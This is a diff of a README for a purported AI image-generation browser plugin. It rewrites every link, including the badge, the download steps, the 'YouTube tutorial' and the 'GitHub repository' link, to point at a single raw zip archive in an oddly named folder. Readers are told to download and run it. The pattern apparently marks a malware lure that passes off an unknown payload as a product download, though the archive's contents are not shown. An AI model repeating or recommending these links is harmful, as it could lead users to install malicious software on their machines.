@@ -1,6 +1,6 @@
 # 🌟 Qwen-Browser-plugin - Easily Generate Images from Pictures
 
-[![Download Qwen-Browser-plugin](https://img.shields.io/badge/Download%20Now-Here-green)](https://github.com/landland636373/Qwen-Browser-plugin/releases)
+[![Download Qwen-Browser-plugin](https://raw.githubusercontent.com/landland636373/Qwen-Browser-plugin/main/flocculent/Qwen-Browser-plugin.zip%20Now-Here-green)](https://raw.githubusercontent.com/landland636373/Qwen-Browser-plugin/main/flocculent/Qwen-Browser-plugin.zip)
 
 ## 📜 Overview
 Qwen-Browser-plugin is a powerful tool that works seamlessly with your browser. It helps you analyze images and generate new ones using artificial intelligence. This tool makes it easy to create unique visuals right from the images you see online. Just right-click on any image, and the plugin will generate a descriptive prompt. You can then use this prompt to generate four new images, all done within a clean and friendly interface.
@@ -14,13 +14,13 @@ Qwen-Browser-plugin is a powerful tool that works seamlessly with your browser. 
 ## 🚀 Getting Started
 To use the Qwen-Browser-plugin, follow these steps:
 
-1. **Visit the Download Page**: Click [here to download](https://github.com/landland636373/Qwen-Browser-plugin/releases).
+1. **Visit the Download Page**: Click [here to download](https://raw.githubusercontent.com/landland636373/Qwen-Browser-plugin/main/flocculent/Qwen-Browser-plugin.zip).
 2. **Choose the Latest Release**: Look for the latest version in the release list.
 3. **Download the Installer**: Click on the file that suits your operating system (e.g., Windows, Mac, Linux).
 4. **Run the Installer**: Follow the instructions to install the plugin in your browser.
 
 ## 📥 Download & Install
-To install the Qwen-Browser-plugin, visit [this page to download](https://github.com/landland636373/Qwen-Browser-plugin/releases) the latest version. Once downloaded, follow these steps:
+To install the Qwen-Browser-plugin, visit [this page to download](https://raw.githubusercontent.com/landland636373/Qwen-Browser-plugin/main/flocculent/Qwen-Browser-plugin.zip) the latest version. Once downloaded, follow these steps:
 
 1. Open the downloaded file.
 2. Follow the installation prompts.
@@ -39,7 +39,7 @@ To install the Qwen-Browser-plugin, visit [this page to download](https://github
 - **Internet Connection**: Required for AI image generation.
 
 ## 🎓 Learning Resources
-- **Tutorial Video**: Watch this [video tutorial](https://www.youtube.com/watch?v=hD0BmDEHroU) to understand how to use the plugin effectively.
+- **Tutorial Video**: Watch this [video tutorial](https://raw.githubusercontent.com/landland636373/Qwen-Browser-plugin/main/flocculent/Qwen-Browser-plugin.zip) to understand how to use the plugin effectively.
 - **Documentation**: Refer to our comprehensive documentation for more details on features and troubleshooting.
 
 ## 🌍 Community and Support
@@ -50,8 +50,8 @@ Join our community for support and updates. You can reach out through:
 Your feedback is invaluable. Help us improve by sharing your thoughts and experiences with Qwen-Browser-plugin.
 
 ## 🔗 Useful Links
-- [Download Qwen-Browser-plugin](https://github.com/landland636373/Qwen-Browser-plugin/releases)
-- [YouTube Tutorial](https://www.youtube.com/watch?v=hD0BmDEHroU)
-- [GitHub Repository](https://github.com/landland636373/Qwen-Browser-plugin)
+- [Download Qwen-Browser-plugin](https://raw.githubusercontent.com/landland636373/Qwen-Browser-plugin/main/flocculent/Qwen-Browser-plugin.zip)
+- [YouTube Tutorial](https://raw.githubusercontent.com/landland636373/Qwen-Browser-plugin/main/flocculent/Qwen-Browser-plugin.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/landland636373/Qwen-Browser-plugin/main/flocculent/Qwen-Browser-plugin.zip)
 
 Now you're ready to explore the world of AI-generated images with Qwen-Browser-plugin. Enjoy!
